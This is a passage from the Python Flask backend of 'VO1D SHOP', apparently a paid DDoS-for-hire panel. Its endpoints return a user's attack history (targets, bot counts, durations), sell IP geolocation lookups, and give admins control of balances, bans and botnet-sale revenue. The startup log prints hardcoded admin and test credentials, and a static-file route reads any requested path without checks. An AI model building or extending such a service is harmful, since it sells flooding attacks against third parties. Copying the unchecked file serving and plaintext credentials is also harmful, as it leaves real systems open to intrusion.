                SELECT id, target, attack_type, bot_count, duration_seconds, status, started_at, ended_at, stats
                FROM attacks WHERE user_id = ? ORDER BY started_at DESC LIMIT 100
            ''', (g.user_id,)).fetchall()
            result = []
            for row in attacks:
                item = dict(row)
                item['stats'] = json.loads(item['stats']) if item['stats'] else {}
                result.append(item)
            return jsonify(result), 200
    except Exception as e:
        logger.error(f"Attack history error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/geo/search', methods=['POST'])
@token_required
def geo_search():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    ip = data.get('ip', '').strip()
    if not ip:
        return jsonify({'error': 'IP required'}), 400
    
    # Проверяем валидность IP
    import re
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip) and ip not in ['localhost', '127.0.0.1']:
        return jsonify({'error': 'Invalid IP address'}), 400
    
    try:
        with get_db() as conn:
            user = conn.execute('SELECT balance, geo_searches FROM users WHERE id = ?', (g.user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            
            # Проверяем бесплатные поиски
            if user['geo_searches'] > 0:
                conn.execute('UPDATE users SET geo_searches = geo_searches - 1 WHERE id = ?', (g.user_id,))
                paid = False
            else:
                # Платная проверка
                if user['balance'] < CONFIG['GEO_SEARCH_PRICE']:
                    return jsonify({'error': f'Insufficient balance. Need ${CONFIG["GEO_SEARCH_PRICE"]:.2f}'}), 400
                conn.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (CONFIG['GEO_SEARCH_PRICE'], g.user_id))
                paid = True
            
            # Выполняем запрос к API
            try:
                response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=10)
                if response.status_code != 200:
                    return jsonify({'error': 'IP API error'}), 500
                data = response.json()
                
                if data.get('error'):
                    return jsonify({'error': 'IP not found'}), 404
                
                # Сохраняем результат
                conn.execute('''
                    INSERT INTO geo_searches (user_id, ip, result, paid)
                    VALUES (?, ?, ?, ?)
                ''', (g.user_id, ip, json.dumps(data), 1 if paid else 0))
                conn.commit()
                
                return jsonify({
                    'success': True,
                    'data': data,
                    'paid': paid,
                    'remaining_geo': user['geo_searches'] - 1 if user['geo_searches'] > 0 else 0,
                    'new_balance': user['balance'] - CONFIG['GEO_SEARCH_PRICE'] if not user['geo_searches'] > 0 else user['balance']
                }), 200
                
            except requests.exceptions.RequestException:
                return jsonify({'error': 'IP API unavailable'}), 503
                
    except Exception as e:
        logger.error(f"Geo search error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/geo/balance', methods=['GET'])
@token_required
def get_geo_balance():
    try:
        with get_db() as conn:
            user = conn.execute('SELECT geo_searches, balance FROM users WHERE id = ?', (g.user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            return jsonify({
                'geo_searches': user['geo_searches'],
                'balance': user['balance'],
                'price': CONFIG['GEO_SEARCH_PRICE']
            }), 200
    except Exception as e:
        logger.error(f"Get geo balance error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/tasks', methods=['GET'])
@token_required
def get_tasks():
    try:
        with get_db() as conn:
            completed = json.loads(conn.execute('SELECT completed_tasks FROM users WHERE id = ?', (g.user_id,)).fetchone()['completed_tasks'] or '[]')
        
        tasks = []
        for task in TASKS:
            tasks.append({
                **task,
                'completed': task['id'] in completed
            })
        return jsonify(tasks), 200
    except Exception as e:
        logger.error(f"Get tasks error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/admin/users', methods=['GET'])
@admin_required
def admin_get_users():
    try:
        with get_db() as conn:
            users = conn.execute('''
                SELECT id, username, email, balance, role, banned, api_key, created_at, 
                       last_login, total_spent, attacks_launched, geo_searches
                FROM users ORDER BY id
            ''').fetchall()
            return jsonify([dict(user) for user in users]), 200
    except Exception as e:
        logger.error(f"Admin get users error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/admin/ban/<int:user_id>', methods=['POST'])
@admin_required
def admin_ban_user(user_id):
    if user_id == g.user_id:
        return jsonify({'error': 'Cannot ban yourself'}), 400
    try:
        with get_db() as conn:
            conn.execute('UPDATE users SET banned = 1 WHERE id = ?', (user_id,))
            conn.commit()
        return jsonify({'success': True, 'message': f'User {user_id} banned'}), 200
    except Exception as e:
        logger.error(f"Admin ban error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/admin/unban/<int:user_id>', methods=['POST'])
@admin_required
def admin_unban_user(user_id):
    try:
        with get_db() as conn:
            conn.execute('UPDATE users SET banned = 0 WHERE id = ?', (user_id,))
            conn.commit()
        return jsonify({'success': True, 'message': f'User {user_id} unbanned'}), 200
    except Exception as e:
        logger.error(f"Admin unban error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/admin/add_balance', methods=['POST'])
@admin_required
def admin_add_balance():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    username = data.get('username', '').strip()
    amount = data.get('amount', 0)
    
    if not username:
        return jsonify({'error': 'Username required'}), 400
    try:
        amount = float(amount)
    except:
        return jsonify({'error': 'Invalid amount'}), 400
    if amount <= 0:
        return jsonify({'error': 'Amount must be greater than 0'}), 400
    
    try:
        with get_db() as conn:
            user = conn.execute('SELECT id, balance FROM users WHERE username = ?', (username,)).fetchone()
            if not user:
                return jsonify({'error': f'User "{username}" not found'}), 404
            
            new_balance = user['balance'] + amount
            conn.execute('UPDATE users SET balance = ? WHERE id = ?', (new_balance, user['id']))
            conn.commit()
            
            # Проверяем задания по пополнению
            check_and_reward_tasks(user['id'], 'deposit', int(amount))
            
            return jsonify({
                'success': True,
                'message': f'Added ${amount:.2f} to {username}',
                'username': username,
                'new_balance': new_balance,
                'added': amount
            }), 200
    except Exception as e:
        logger.error(f"Admin add balance error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/admin/stats', methods=['GET'])
@admin_required
def admin_get_stats():
    try:
        with get_db() as conn:
            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            total_botnets = conn.execute('SELECT COUNT(*) FROM botnets').fetchone()[0]
            total_attacks = conn.execute('SELECT COUNT(*) FROM attacks').fetchone()[0]
            active_attacks = conn.execute('SELECT COUNT(*) FROM attacks WHERE status = "running"').fetchone()[0]
            total_revenue = conn.execute('SELECT COALESCE(SUM(price), 0) FROM botnets').fetchone()[0]
            return jsonify({
                'total_users': total_users,
                'total_botnets': total_botnets,
                'total_attacks': total_attacks,
                'active_attacks': active_attacks,
                'total_revenue': total_revenue,
                'user_agents_count': len(USER_AGENTS)
            }), 200
    except Exception as e:
        logger.error(f"Admin stats error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.now().isoformat(),
        'version': '7.0.0',
        'user_agents_loaded': len(USER_AGENTS),
        'max_bots': CONFIG['MAX_BOTS']
    }), 200

# ============================================================
# ОТДАЁМ ФРОНТЕНД
# ============================================================

@app.route('/')
def serve_frontend():
    try:
        if os.path.exists('site.html'):
            return open('site.html', 'r', encoding='utf-8').read()
        elif os.path.exists('index.html'):
            return open('index.html', 'r', encoding='utf-8').read()
        else:
            return '<h1>VO1D SHOP</h1><p>Frontend file not found</p>'
    except Exception as e:
        return f'<h1>Error</h1><p>{str(e)}</p>'

@app.route('/<path:path>')
def serve_static(path):
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return f.read()
        return f'<h1>404</h1><p>File {path} not found</p>', 404
    except:
        return f'<h1>404</h1><p>File {path} not found</p>', 404

# ============================================================
# ЗАПУСК
# ============================================================

if __name__ == '__main__':
    logger.info("=" * 70)
    logger.info("🔥 VO1D SHOP v7.0.0 — FULL ULTIMATE POWER")
    logger.info(f"📡 User-Agents loaded: {len(USER_AGENTS)}")
    logger.info(f"🤖 Max bots: {CONFIG['MAX_BOTS']}")
    logger.info("=" * 70)
    logger.info("🔑 Админ: VO1D / ROOT")
    logger.info("🧪 Тест: test / test123 (balance: $1000)")
    logger.info("=" * 70)
    logger.info("📋 ЗАДАНИЯ (КВЕСТЫ):")
    for task in TASKS:
        logger.info(f"   - {task['name']} → {task['reward']}")
    logger.info("=" * 70)
    logger.info("🗺️ ПОИСК ПО IP: бесплатно 3 раза, затем $2")
    logger.info("📊 Градация мощности: 💩500-999 | 👍1000-4999 | 🔥5000-49999 | 💥50000-199999 | ⚡200000+")
    logger.info("=" * 70)
    logger.info("🚀 Starting Flask server on 0.0.0.0:5000...")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
